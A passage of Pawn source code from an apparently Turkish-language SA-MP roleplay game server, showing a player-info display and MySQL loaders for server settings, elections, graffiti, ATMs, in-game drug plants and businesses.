	cache_delete(cache);
	if(Karakter[targetid][ceza] >= 1)
	{
	    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}----------CEZA DURUMU----------");
	    format(string, sizeof(string), "Ödenmemiþ ceza: $%d", Karakter[targetid][ceza]);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    format(string, sizeof(string), "Ceza kesilme nedeni: %s", Karakter[targetid][cezaneden]);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
}

BilgileriGoster(playerid, targetid)
{
	new cins[6], string[568], job[32], tenrengi[7], targetfact[32],targetrank[50], sayulankopek, saysanaulankopek,saycanmibilo, evarmi[4]; //admlevel[32];
	sayulankopek = AracSay(targetid);
	saysanaulankopek = IsyeriSay(targetid);
	saycanmibilo = Evlerim(targetid);
	switch(Karakter[targetid][cinsiyet])
	{
	    case 1: format(cins, sizeof(cins), "Erkek");
	    case 2: format(cins, sizeof(cins), "Kadýn");
	}
	switch(Karakter[targetid][uyruk])
	{
	    case 1: format(tenrengi, sizeof(tenrengi), "Siyahi");
	    case 2: format(tenrengi, sizeof(tenrengi), "Beyaz");
	}
	switch(Karakter[targetid][meslek])
	{
	    case 0: format(job, sizeof(job), "(Ýþsiz)");
	    case 1: format(job, sizeof(job), "Sevkiyat");
	    case 2: format(job, sizeof(job), "Taksici");
	    case 3: format(job, sizeof(job), "Tezgahtar");
	    case 4: format(job, sizeof(job), "Pizzacý");
	    case 5: format(job, sizeof(job), "Araç Sicil Temizleme");
     	case 6: format(job, sizeof(job), "Otobüs Þöförlüðü");
     	case 7: format(job, sizeof(job), "Temizlik Görevlisi");
     	case 8: format(job, sizeof(job), "Kamyoncu");
     	case 9: format(job, sizeof(job), "Elektronik");
     	case 10: format(job, sizeof(job), "Lojistik Taþýmacý");
	}
	switch(Karakter[targetid][ehliyet])
	{
	    case 0: format(evarmi, sizeof(evarmi), "Yok");
	    case 1: format(evarmi, sizeof(evarmi), "Var");
	}
	if(Karakter[targetid][birlik] == 0)
	{
		targetfact = "Sivil";
	}
	else
	{
 		format(targetfact, sizeof(targetfact), Birlik[Karakter[targetid][birlik]][fisim]);
	}
	switch(Karakter[targetid][rutbe])
	{
 		case 0: targetrank = "Sivil";
		case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe1]);
		case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe2]);
  		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe3]);
    	case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe4]);
	    case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe5]);
	    case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe6]);
		case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe7]);
		case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe8]);
		case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe9]);
		case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe10]);
		case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe11]);
		case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe12]);
		case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe13]);
		case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe14]);
		case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe15]);
		case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe16]);
		case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe17]);
		case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe18]);
		case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe19]);
		case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe20]);
	}
    new maas;
    if(Karakter[targetid][rutbe] == 1) maas = Birlik[Karakter[targetid][birlik]][rutbe1maas];
    if(Karakter[targetid][rutbe] == 2) maas = Birlik[Karakter[targetid][birlik]][rutbe2maas];
    if(Karakter[targetid][rutbe] == 3) maas = Birlik[Karakter[targetid][birlik]][rutbe3maas];
    if(Karakter[targetid][rutbe] == 4) maas = Birlik[Karakter[targetid][birlik]][rutbe4maas];
    if(Karakter[targetid][rutbe] == 5) maas = Birlik[Karakter[targetid][birlik]][rutbe5maas];
    if(Karakter[targetid][rutbe] == 6) maas = Birlik[Karakter[targetid][birlik]][rutbe6maas];
    if(Karakter[targetid][rutbe] == 7) maas = Birlik[Karakter[targetid][birlik]][rutbe7maas];
    if(Karakter[targetid][rutbe] == 8) maas = Birlik[Karakter[targetid][birlik]][rutbe8maas];
    if(Karakter[targetid][rutbe] == 9) maas = Birlik[Karakter[targetid][birlik]][rutbe9maas];
    if(Karakter[targetid][rutbe] == 10) maas = Birlik[Karakter[targetid][birlik]][rutbe10maas];
    if(Karakter[playerid][rutbe] == 11) maas = Birlik[Karakter[playerid][birlik]][rutbe11maas];
    if(Karakter[playerid][rutbe] == 12) maas = Birlik[Karakter[playerid][birlik]][rutbe12maas];
    if(Karakter[playerid][rutbe] == 13) maas = Birlik[Karakter[playerid][birlik]][rutbe13maas];
    if(Karakter[playerid][rutbe] == 14) maas = Birlik[Karakter[playerid][birlik]][rutbe14maas];
    if(Karakter[playerid][rutbe] == 15) maas = Birlik[Karakter[playerid][birlik]][rutbe15maas];
    if(Karakter[playerid][rutbe] == 16) maas = Birlik[Karakter[playerid][birlik]][rutbe16maas];
    if(Karakter[playerid][rutbe] == 17) maas = Birlik[Karakter[playerid][birlik]][rutbe17maas];
    if(Karakter[playerid][rutbe] == 18) maas = Birlik[Karakter[playerid][birlik]][rutbe18maas];
    if(Karakter[playerid][rutbe] == 19) maas = Birlik[Karakter[playerid][birlik]][rutbe19maas];
    if(Karakter[playerid][rutbe] == 20) maas = Birlik[Karakter[playerid][birlik]][rutbe20maas];
	new _para;
	switch(Karakter[targetid][level])
	{
	    case 0..4: _para=200;
	    case 5..9: _para=250;
	    case 10..14: _para=300;
	    case 15..19: _para=350;
	    case 20..24: _para=400;
	    case 25..30: _para=500;
	    default: _para=600;
	}
	new paycheck = (_para+maas);

	format(string, sizeof(string), ""C13"| "C1"%s (SQLID:%d) "C13"|", OyuncuAdiniBul(targetid), Karakter[targetid][sqlid]);
	//new cizgilazim = strlen(string)-9;
 	SendClientMessage(playerid, -1, string);
  	format(string, sizeof(string), ""C7"| Hesap: "C7"Forum Nick: %s, Seviye: %d, Tecrübe: %d/%d", Karakter[targetid][nick], Karakter[targetid][level], Karakter[targetid][exp], Karakter[targetid][level]*4);
  	SendClientMessage(playerid, -1, string);
   	format(string, sizeof(string), ""C13"| Karakter: "C13"Vatandaþlýk Numarasý: %d, Birlik: %s, Rütbe: %s, Meslek: %s", Karakter[targetid][kimlikno], targetfact, targetrank, job);
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), ""C7"| Bilgiler: "C7"Banka Hesap No: %d, Telefon No: %d, Ehliyet: %s", Karakter[targetid][hesapno], Karakter[targetid][telno], evarmi);
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), ""C13"| Bilgiler: "C13"Cüzdandaki Para: %d$, Bankadaki Para: %d$, Bitcoin: %.2f, PayDay: %d$, PayDay Süresi: %ddk", Karakter[targetid][para], BankaPara(targetid), Karakter[targetid][bitcoin], paycheck, Karakter[targetid][payday]);
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), ""C7"| Mülk: "C7"Ev: %d Adet (/evlerim), Ýþyeri: %d Adet (/isyerlerim), Araç: %d Adet (/a liste)", saycanmibilo, saysanaulankopek ,sayulankopek);
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), ""C13"| Oyun Süresi: "C13"%d Saat", Karakter[targetid][oyunsure]);
	SendClientMessage(playerid, -1, string);
}

MySQLFetchAcctSingle(sqlplayerid, sqlvalname[], sqlresult[], len = sizeof(sqlresult))
{
	new query[1024];
	format(query, sizeof(query), "SELECT `%s` FROM `karakterler` WHERE `id` = '%d' LIMIT 1", sqlvalname, sqlplayerid);
	new Cache:cache = mysql_query(query,true);
	if(cache_get_row_count())
	{
	    cache_get_row(0,0, sqlresult,1,len);
	    cache_delete(cache);
		return 1;
	}
    cache_delete(cache);
	return 0;
}

KillTimers(playerid)
{
	KillTimerEx(TimerGirisKontrol[playerid]);
	TimerGirisKontrol[playerid] = -1;
	KillTimerEx(UnfreezeTimerVar[playerid]);
	UnfreezeTimerVar[playerid] = -1;
    KillTimerEx(PayDayTimerPublic[playerid]);
    PayDayTimerPublic[playerid] = -1;
	KillTimerEx(UyusturucuEtkiVar[playerid]);
	UyusturucuEtkiVar[playerid] = -1;

	balikvuruyortimer[playerid] = -1;
}

stock mysql_fetch_row(strer[],id)
{
	new fielddata[64];
	format(strer,6,"");
	for(new i;i < cache_get_field_count();i++)
	{
	    cache_get_row(id,i,fielddata);
	    strcat(strer,fielddata,1024);
	    strcat(strer,"|",1024);
	}
	return 1;
}

forward VerileriYukle();
public VerileriYukle()
{
	new query[1024];
	new arrCoords[128][128];
	format(query, sizeof(query), "SELECT * FROM `veriler` LIMIT 1");
	new Cache:cache = mysql_query(query,true);
    mysql_fetch_row(query,0);
    split(query, arrCoords, '|', 128);
    Veriler[gdurum] = strval(arrCoords[1]);
    Veriler[gposx] = floatstr(arrCoords[2]);
    Veriler[gposy] = floatstr(arrCoords[3]);
    Veriler[gposz] = floatstr(arrCoords[4]);
    Veriler[tiX] = floatstr(arrCoords[5]);
    Veriler[tiY] = floatstr(arrCoords[6]);
    Veriler[tiZ] = floatstr(arrCoords[7]);
    Veriler[tX] = floatstr(arrCoords[8]);
    Veriler[tY] = floatstr(arrCoords[9]);
    Veriler[tZ] = floatstr(arrCoords[10]);
    Veriler[tint] = strval(arrCoords[11]);
    Veriler[tvw] = strval(arrCoords[12]);
    Veriler[isbasiX] = floatstr(arrCoords[13]);
    Veriler[isbasiY] = floatstr(arrCoords[14]);
    Veriler[isbasiZ] = floatstr(arrCoords[15]);
    Veriler[isbasint] = strval(arrCoords[16]);
    Veriler[isbasivw] = strval(arrCoords[17]);
    Veriler[sevkX] = floatstr(arrCoords[18]);
    Veriler[sevkY] = floatstr(arrCoords[19]);
    Veriler[sevkZ] = floatstr(arrCoords[20]);
    Veriler[sevkint] = strval(arrCoords[21]);
    Veriler[sevkvw] = strval(arrCoords[22]);
    Veriler[balikX] = floatstr(arrCoords[23]);
    Veriler[balikY] = floatstr(arrCoords[24]);
    Veriler[balikZ] = floatstr(arrCoords[25]);
    Veriler[bankX] = floatstr(arrCoords[26]);
    Veriler[bankY] = floatstr(arrCoords[27]);
    Veriler[bankZ] = floatstr(arrCoords[28]);
    Veriler[bankint] = strval(arrCoords[29]);
    Veriler[bankvw] = strval(arrCoords[30]);
    Veriler[taksiX] = floatstr(arrCoords[31]);
    Veriler[taksiY] = floatstr(arrCoords[32]);
    Veriler[taksiZ] = floatstr(arrCoords[33]);
    Veriler[reklamX] = floatstr(arrCoords[34]);
    Veriler[reklamY] = floatstr(arrCoords[35]);
    Veriler[reklamZ] = floatstr(arrCoords[36]);
    Veriler[reklamint] = strval(arrCoords[37]);
	Veriler[tezgahX] = floatstr(arrCoords[38]);
	Veriler[tezgahY] = floatstr(arrCoords[39]);
	Veriler[tezgahZ] = floatstr(arrCoords[40]);
	Veriler[tezgahint] = strval(arrCoords[41]);
	Veriler[ekipmanX] = floatstr(arrCoords[42]);
	Veriler[ekipmanY] = floatstr(arrCoords[43]);
	Veriler[ekipmanZ] = floatstr(arrCoords[44]);
	Veriler[ekipmanint] = strval(arrCoords[45]);
	Veriler[ekipmanvw] = strval(arrCoords[46]);
	Veriler[pizzaX] = strval(arrCoords[47]);
	Veriler[pizzaY] = strval(arrCoords[48]);
	Veriler[pizzaZ] = strval(arrCoords[49]);
	Veriler[yiyecekfiyat] = strval(arrCoords[51]);
	Veriler[ickifiyat] = strval(arrCoords[52]);
	Veriler[benzinfiyat]= strval(arrCoords[53]);
	Veriler[ehliyetX] = strval(arrCoords[54]);
	Veriler[ehliyetY] = strval(arrCoords[55]);
	Veriler[ehliyetZ] = strval(arrCoords[56]);
	Veriler[aracsicilX] = strval(arrCoords[57]);
	Veriler[aracsicilY] = strval(arrCoords[58]);
	Veriler[aracsicilZ] = strval(arrCoords[59]);
	Veriler[otobusX] = strval(arrCoords[60]);
	Veriler[otobusY] = strval(arrCoords[61]);
	Veriler[otobusZ] = strval(arrCoords[62]);
	Veriler[temizlikX] = 583.2725;
	Veriler[temizlikY] = -1386.9320;
	Veriler[temizlikZ] = 13.9251;
	Veriler[cctvx] = floatstr(arrCoords[67]);
	Veriler[cctvy] = floatstr(arrCoords[68]);
	Veriler[cctvz] = floatstr(arrCoords[69]);
	Veriler[cctvint] = strval(arrCoords[70]);
	Veriler[cctvvw] = strval(arrCoords[71]);
	format(Veriler[aractahta], 128, "%s", arrCoords[72]);
	Veriler[aractahtax] = floatstr(arrCoords[73]);
	Veriler[aractahtay] = floatstr(arrCoords[74]);
	Veriler[aractahtaz] = floatstr(arrCoords[75]);
	Veriler[aractahtarz] = floatstr(arrCoords[76]);
	Veriler[aractahtaint] = strval(arrCoords[77]);
	Veriler[aractahtavw] = strval(arrCoords[78]);
	Veriler[aractahtayazix] = floatstr(arrCoords[79]);
	Veriler[aractahtayaziy] = floatstr(arrCoords[80]);
	Veriler[aractahtayaziz] = floatstr(arrCoords[81]);

    Veriler[ekipmanpickup] = CreateDynamicPickup(1239, 1, Veriler[ekipmanX], Veriler[ekipmanY], Veriler[ekipmanZ],Veriler[ekipmanvw],Veriler[ekipmanint],-1,50);
    Veriler[ekipmantext] = CreateDynamic3DTextLabel("EKÝPMAN [Y]", 0xECECECFF, Veriler[ekipmanX], Veriler[ekipmanY], Veriler[ekipmanZ], 15, .worldid=Veriler[ekipmanvw], .interiorid=Veriler[ekipmanint]);
    Veriler[cctvpickup] = CreateDynamicPickup(1239, 1, Veriler[cctvx], Veriler[cctvy], Veriler[cctvz],Veriler[cctvvw],Veriler[cctvint],-1,50);
    Veriler[cctvtext] = CreateDynamic3DTextLabel("{f9f9f9} ''/cctv''", 0xECECECFF, Veriler[cctvx], Veriler[cctvy], Veriler[cctvz], 15, .worldid=Veriler[cctvvw], .interiorid=Veriler[cctvint]);
    Veriler[gpickup] = CreateDynamicPickup(1239, 1, Veriler[gposx], Veriler[gposy], Veriler[gposz],-1,0,-1,50);
    Veriler[sevkpickup] = CreateDynamicPickup(1239, 1, Veriler[sevkX], Veriler[sevkY], Veriler[sevkZ],-1,0,-1,50);
    Veriler[sevktext] = CreateDynamic3DTextLabel("{f9f9f9} "C3"Sevkiyat Mesleði", 0xAFAFAFFF, Veriler[sevkX], Veriler[sevkY], Veriler[sevkZ], 15);
    Veriler[balikpickup] = CreateDynamicPickup(1239, 1, Veriler[balikX], Veriler[balikY], Veriler[balikZ],-1,0,-1,50);
    Veriler[bankpickup] = CreateDynamicPickup(1239, 1, Veriler[bankX], Veriler[bankY], Veriler[bankZ],Veriler[bankvw],Veriler[bankint],-1,50);
    Veriler[taksipickup] = CreateDynamicPickup(1239, 1, Veriler[taksiX], Veriler[taksiY], Veriler[taksiZ],-1,0,-1,50);
    Veriler[taksitext] = CreateDynamic3DTextLabel("{f9f9f9} "C3"Taksicilik Mesleði", 0xAFAFAFFF, Veriler[taksiX], Veriler[taksiY], Veriler[taksiZ], 15);
	Veriler[tezgahpickup] = CreateDynamicPickup(1239, 1, Veriler[tezgahX], Veriler[tezgahY], Veriler[tezgahZ],-1,Veriler[tezgahint],-1,50);
	Veriler[pizzapickup] = CreateDynamicPickup(1239, 1, Veriler[pizzaX], Veriler[pizzaY], Veriler[pizzaZ],-1,0,-1,50);
	Veriler[pizzatext] = CreateDynamic3DTextLabel("[/meslek gir]\n[/meslek isbasi]", 0xAFAFAFFF, Veriler[pizzaX], Veriler[pizzaY], Veriler[pizzaZ], 15);
	Veriler[ehliyetpickup] = CreateDynamicPickup(1239, 1, Veriler[ehliyetX], Veriler[ehliyetY], Veriler[ehliyetZ],-1,0,-1,50);
	Veriler[aracsicilpickup] = CreateDynamicPickup(1239, 1, Veriler[aracsicilX], Veriler[aracsicilY], Veriler[aracsicilZ],-1,0,-1,50);
	Veriler[aracsiciltext] = CreateDynamic3DTextLabel("{f9f9f9} "C3"Arac Sicil Temizleme Mesleði", 0xAFAFAFFF, Veriler[aracsicilX], Veriler[aracsicilY], Veriler[aracsicilZ], 15);
	Veriler[otobuspickup] = CreateDynamicPickup(1239, 1, Veriler[otobusX], Veriler[otobusY], Veriler[otobusZ],-1,0,-1,50);
	Veriler[otobustext] = CreateDynamic3DTextLabel("{f9f9f9} "C3"Otobüs Þöförlüðü Mesleði\n{f9f9f9}[/meslek]", 0xAFAFAFFF, Veriler[otobusX], Veriler[otobusY], Veriler[otobusZ], 15);
	Veriler[temizlikpickup] = CreateDynamicPickup(1239, 1, Veriler[temizlikX], Veriler[temizlikY], Veriler[temizlikZ],-1,0,-1,50);
	Veriler[temizliktext] = CreateDynamic3DTextLabel("{f9f9f9} "C3"Temizlikçilik Mesleði\n{f9f9f9}[/meslek]", 0xAFAFAFFF, Veriler[temizlikX], Veriler[temizlikY], Veriler[temizlikZ], 15);
	Veriler[aractahtaobje] = CreateDynamicObject(3077, Veriler[aractahtax], Veriler[aractahtay], Veriler[aractahtaz], 0, 0, Veriler[aractahtarz], Veriler[aractahtavw], Veriler[aractahtaint]);
	SetDynamicObjectMaterial(Veriler[aractahtaobje], 0, 3925, "weemap", "Bow_Abattoir_Conc2");
	Veriler[aractahtayazi] = CreateDynamicObject(19482, Veriler[aractahtayazix], Veriler[aractahtayaziy], Veriler[aractahtayaziz], 0, 0, -Veriler[aractahtarz]-90, Veriler[aractahtavw], Veriler[aractahtaint]);
    CreateDynamicPickup(1239, 1, 2219.3762,-2666.3638,13.5399,-1,0,-1,50);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"Hafriyat Mesleði\n{f9f9f9}[/meslek]", 0xAFAFAFFF, 2219.3762,-2666.3638,13.5399, 15);
    CreateDynamicPickup(1239, 1, 2448.8557,-2620.3879,13.6572,-1,0,-1,50);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"Elektronik Mesleði\n{f9f9f9}[/meslek]", 0xAFAFAFFF, 2448.8557,-2620.3879,13.6572, 15);
    CreateDynamicPickup(1239, 1, 2281.1309,-2365.0793,13.5469,-1,0,-1,50);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"Lojistik Mesleði\n{f9f9f9}[/meslek]", 0xAFAFAFFF, 2281.1309,-2365.0793,13.5469, 15);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"Acemi Balýkçý", 0xAFAFAFFF, Veriler[balikX], Veriler[balikY], Veriler[balikZ], 15);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"Becerikli Balýkçý", 0xAFAFAFFF, 2158.2532,-107.3651,3.1621, 15);
    CreateDynamicPickup(1239, 1, 2158.2532,-107.3651,3.1621,-1,0,-1,50);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"Usta Balýkçý", 0xAFAFAFFF, 252.1838,-3466.7554,14.5975, 15);
    CreateDynamicPickup(1239, 1, 252.1838,-3466.7554,14.5975,-1,0,-1,50);
	new mstring[128];
	new _x_bol[5][4];
	strexplode(_x_bol, Veriler[aractahta], ",");
	for(new i=0;i<5;i++) {
		if(strval(_x_bol[i]) < 400 || strval(_x_bol[i]) > 611) {
			_x_bol[i] = "612";
		}
	}
    format(mstring, sizeof(mstring), "%s\n%s\n%s\n%s\n%s",VehicleName[strval(_x_bol[0])-400][0],VehicleName[strval(_x_bol[1])-400][0],VehicleName[strval(_x_bol[2])-400][0],VehicleName[strval(_x_bol[3])-400][0],VehicleName[strval(_x_bol[4])-400][0]);
	SetDynamicObjectMaterialText(Veriler[aractahtayazi], 0, mstring, 90, "Arial", 16, 1, -218103808, 0, 1);
	cache_delete(cache);
	return 1;
}

//secim
forward SecimlerYukle();
public SecimlerYukle()
{
    new query[1024];
	new arrCoords[10][64];
	format(query, sizeof(query), "SELECT * FROM `secim`");
	new Cache:cache = mysql_query(query,true);
	for(new i;i<cache_get_row_count();i++)
  	{
  	    mysql_fetch_row(query,i);
	    split(query, arrCoords, '|', 64);
	    Secim[secid] = strval(arrCoords[0]);
		Secim[sarah] = strval(arrCoords[1]);
		Secim[marshall] = strval(arrCoords[2]);
	}
	cache_delete(cache);
	return 1;
}
forward GraffitiYukle();
public GraffitiYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_GRAFFITI)
	{
		new graffitid = cache_get_field_content_int(i, "GraffitiID");
		Graffitiler[graffitid][gID] = cache_get_field_content_int(i, "GraffitiID");
		Graffitiler[graffitid][gPos][0] = cache_get_field_content_float(i, "gX");
		Graffitiler[graffitid][gPos][1] = cache_get_field_content_float(i, "gY");
		Graffitiler[graffitid][gPos][2] = cache_get_field_content_float(i, "gZ");
		Graffitiler[graffitid][gRot][0] = cache_get_field_content_float(i, "gRX");
		Graffitiler[graffitid][gRot][1] = cache_get_field_content_float(i, "gRY");
		Graffitiler[graffitid][gRot][2] = cache_get_field_content_float(i, "gRZ");
		Graffitiler[graffitid][gYapan] = cache_get_field_content_int(i, "gYapan");
		Graffitiler[graffitid][gRenk] = cache_get_field_content_int(i, "gRenk");
		Graffitiler[graffitid][gInt] = cache_get_field_content_int(i, "gInt");
		Graffitiler[graffitid][gVW] = cache_get_field_content_int(i, "gVW");
		cache_get_field_content(i, "gYazi", Graffitiler[graffitid][gYazi], g_iHandle, 255);
		cache_get_field_content(i, "gFont", Graffitiler[graffitid][gFont], g_iHandle, 255);
		Graffitiler[graffitid][MateryalBoyut] = cache_get_field_content_int(i, "MateryalBoyut");
		Graffitiler[graffitid][FontBoyut] = cache_get_field_content_int(i, "FontBoyut");
		Graffitiler[graffitid][FontBold2] = cache_get_field_content_int(i, "FontBold2");
		Graffitiler[graffitid][Ortala] = cache_get_field_content_int(i, "Ortala");
		Graffitiler[graffitid][gObje] = CreateDynamicObject(19482,Graffitiler[graffitid][gPos][0],Graffitiler[graffitid][gPos][1],Graffitiler[graffitid][gPos][2],Graffitiler[graffitid][gRot][0],Graffitiler[graffitid][gRot][1],Graffitiler[graffitid][gRot][2],.worldid=Graffitiler[graffitid][gVW],.interiorid=Graffitiler[graffitid][gInt]);
		SetDynamicObjectMaterialText(Graffitiler[graffitid][gObje], 0,Graffitiler[graffitid][gYazi],Graffitiler[graffitid][MateryalBoyut],Graffitiler[graffitid][gFont],Graffitiler[graffitid][FontBoyut],Graffitiler[graffitid][FontBold2],Graffitiler[graffitid][gRenk],0,Graffitiler[graffitid][Ortala]);
	}
	printf("%d Graffiti Yüklendi.",rows);
	return 1;
}
ATMYukle()
{
	new query[1024];
	new arrCoords[10][64];
	new atmidd;
	format(query, sizeof(query), "SELECT * FROM `atm`");
	new Cache:cache = mysql_query(query,true);
	for(new i;i<cache_get_row_count();i++)
  	{
  	    mysql_fetch_row(query,i);
	    split(query, arrCoords, '|', 64);
		atmidd = strval(arrCoords[0]);
		ATM[atmidd][atmid] = strval(arrCoords[0]);
		ATM[atmidd][atmx] = floatstr(arrCoords[1]);
		ATM[atmidd][atmy] = floatstr(arrCoords[2]);
		ATM[atmidd][atmz] = floatstr(arrCoords[3]);
		ATM[atmidd][atmrx] = floatstr(arrCoords[4]);
		ATM[atmidd][atmry] = floatstr(arrCoords[5]);
		ATM[atmidd][atmrz] = floatstr(arrCoords[6]);
		ATM[atmidd][atmint] = strval(arrCoords[7]);
		ATM[atmidd][atmvw] = strval(arrCoords[8]);
		ATM[atmidd][atmobje] = CreateDynamicObject(19324, ATM[atmidd][atmx], ATM[atmidd][atmy], ATM[atmidd][atmz], ATM[atmidd][atmrx],ATM[atmidd][atmry],ATM[atmidd][atmrz],ATM[atmidd][atmvw],ATM[atmidd][atmint], -1, 500.0);
	}
	cache_delete(cache);
	return 1;
}

forward UyusturucuYukle();
public UyusturucuYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_DRUGS)
	{
		new uyid = cache_get_field_content_int(i, "id");
		Uyusturucu[uyid][uid] = cache_get_field_content_int(i, "id");
		Uyusturucu[uyid][utip] = cache_get_field_content_int(i, "tip");
		Uyusturucu[uyid][udurum] = cache_get_field_content_int(i, "durum");
		Uyusturucu[uyid][udakika] = cache_get_field_content_int(i, "dakika");
		Uyusturucu[uyid][ux] = cache_get_field_content_float(i, "x");
		Uyusturucu[uyid][uy] = cache_get_field_content_float(i, "y");
		Uyusturucu[uyid][uz] = cache_get_field_content_float(i, "z");
		Uyusturucu[uyid][uinterior] = cache_get_field_content_int(i, "interior");
		Uyusturucu[uyid][uvworld] = cache_get_field_content_int(i, "vworld");

		if(Uyusturucu[uyid][utip] == 0) Uyusturucu[uyid][uobje] = CreateDynamicObject(2203, Uyusturucu[uyid][ux], Uyusturucu[uyid][uy], Uyusturucu[uyid][uz], 0.0, 0.0, 0.0, Uyusturucu[uyid][uvworld], Uyusturucu[uyid][uinterior]);
		else if(Uyusturucu[uyid][utip] != 0) Uyusturucu[uyid][uobje] = CreateDynamicObject(2195, Uyusturucu[uyid][ux], Uyusturucu[uyid][uy], Uyusturucu[uyid][uz], 0.0, 0.0, 0.0, Uyusturucu[uyid][uvworld], Uyusturucu[uyid][uinterior]);
        new _mstring[64],_utext[10];
	    if(Uyusturucu[uyid][utip] == 1) _utext = "Esrar";
	    if(Uyusturucu[uyid][utip] == 2) _utext = "Kokain";
	    if(Uyusturucu[uyid][utip] == 3) _utext = "Eroin";
     	new _dk=Uyusturucu[uyid][udakika];
	    if(180 <= _dk <= 190)_dk=180;
	    if(_dk>190)_dk=0;
	    format(_mstring, sizeof(_mstring), "%s\n%d%",_utext,floatround((_dk*100)/180));
	    if(Uyusturucu[uyid][udurum] == 3) format(_mstring, sizeof(_mstring), "**Su Ýhtiyacý Var.\n%s\n%d%",_utext,floatround((_dk*100)/180));
	    if(Uyusturucu[uyid][udurum] == 1) format(_mstring, sizeof(_mstring), "**Toplanmaya Hazýr.\n%s\n%d%",_utext,floatround((_dk*100)/180));
	    if(Uyusturucu[uyid][udurum] == 2) format(_mstring, sizeof(_mstring), "**Çürümüþ.\n%s\n%d%",_utext,floatround((_dk*100)/180));
		if(Uyusturucu[uyid][utip] != 0) Uyusturucu[uyid][ulabel] = CreateDynamic3DTextLabel(_mstring, COLOR_YELLOW,  Uyusturucu[uyid][ux], Uyusturucu[uyid][uy], Uyusturucu[uyid][uz], 5, .worldid=Uyusturucu[uyid][uvworld], .interiorid=Uyusturucu[uyid][uinterior]);
	}
	printf("%d Uyuþturucu Yüklendi.",rows);
	return 1;
}

forward IsyeriYukle();
public IsyeriYukle()
{
    static
	    rows,
	    fields,
		cati[128];

	new isid;
	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_ISYERI)
	{
	    isid = cache_get_field_content_int(i, "sqlid");
 		Isyeri[isid][iid] = cache_get_field_content_int(i, "sqlid");
		cache_get_field_content(i, "ad", Isyeri[isid][iad], g_iHandle, 255);
		Isyeri[isid][isahip] = cache_get_field_content_int(i, "isahip");
		Isyeri[isid][girisX] = cache_get_field_content_float(i, "girisx");
		Isyeri[isid][girisY] = cache_get_field_content_float(i, "girisy");
		Isyeri[isid][girisZ] = cache_get_field_content_float(i, "girisz");
		Isyeri[isid][igirisvw] = cache_get_field_content_int(i, "girisvw");
		Isyeri[isid][igirisint] = cache_get_field_content_int(i, "girisint");
		Isyeri[isid][girisangle] = cache_get_field_content_float(i, "girisangle");
		Isyeri[isid][cikisX] = cache_get_field_content_float(i, "cikisx");
		Isyeri[isid][cikisY] = cache_get_field_content_float(i, "cikisy");
		Isyeri[isid][cikisZ] = cache_get_field_content_float(i, "cikisz");
		Isyeri[isid][icikisint] = cache_get_field_content_int(i, "cikisint");
		Isyeri[isid][cikisangle] = cache_get_field_content_float(i, "cikisangle");
		Isyeri[isid][ifiyat] = cache_get_field_content_int(i, "fiyat");
		Isyeri[isid][girisucreti] = cache_get_field_content_int(i, "girisucreti");
		Isyeri[isid][ikasa] = cache_get_field_content_int(i, "kasa");
		Isyeri[isid][ivergi] = cache_get_field_content_int(i, "vergi");
		Isyeri[isid][ikilit] = cache_get_field_content_int(i, "kilit");
		Isyeri[isid][itip] = cache_get_field_content_int(i, "tip");
		Isyeri[isid][icikisvw] = cache_get_field_content_int(i, "icikisvw");
		Isyeri[isid][istok] = cache_get_field_content_int(i, "istok");
		cache_get_field_content(i, "karsilama", Isyeri[isid][karsilama], g_iHandle, 255);
		Isyeri[isid][kira] = cache_get_field_content_int(i, "kira");
		Isyeri[isid][kiralayan] = cache_get_field_content_int(i, "kiralayan");
		Isyeri[isid][kirafiyat] = cache_get_field_content_int(i, "kirafiyat");
		Isyeri[isid][ortak] = cache_get_field_content_int(i, "ortak");
		Isyeri[isid][isci][0] = cache_get_field_content_int(i, "isci1");
		Isyeri[isid][isci][1] = cache_get_field_content_int(i, "isci2");
		Isyeri[isid][isci][2] = cache_get_field_content_int(i, "isci3");
		Isyeri[isid][isci][3] = cache_get_field_content_int(i, "isci4");
		Isyeri[isid][isci][4] = cache_get_field_content_int(i, "isci5");
